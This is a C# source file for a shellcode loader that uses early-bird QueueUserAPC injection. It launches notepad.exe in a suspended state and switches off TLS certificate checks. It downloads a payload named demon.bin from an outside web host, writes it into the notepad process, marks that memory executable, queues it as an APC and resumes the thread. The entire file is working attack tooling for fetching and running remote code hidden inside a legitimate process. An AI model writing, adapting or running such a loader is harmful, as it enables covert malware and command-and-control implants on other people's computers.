using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace QueueUserAPC
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var si = new Win32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new Win32.PROCESS_INFORMATION();

            var success = Win32.CreateProcessW(
                "C:\\Windows\\System32\\notepad.exe",
                null,
                ref ta,
                ref pa,
                false,
                0x00000004, 
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            if (success)
                Console.WriteLine("Suspen Proc crea  pid: {0}", pi.dwProcessId);
            else
                throw new Win32Exception(Marshal.GetLastWin32Error());

            var process = Process.GetProcessById(pi.dwProcessId);
            Console.WriteLine("Target Handle: 0x{0:X}", process.Handle.ToInt64());

        
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://comsecops.com/demon.bin");
                }
            }

            var baseAddress = Win32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            Console.WriteLine("Base Address: 0x{0:x}", baseAddress);

            Win32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Console.WriteLine("shel inj!");

            Win32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            Console.WriteLine("Flipp Mem Protec");

            Win32.QueueUserAPC(
                baseAddress, 
                pi.hThread,  
                0);

            Console.WriteLine("Queu apc!");

            Win32.ResumeThread(pi.hThread);

            Console.WriteLine("Res Thre!");
        }
    }
}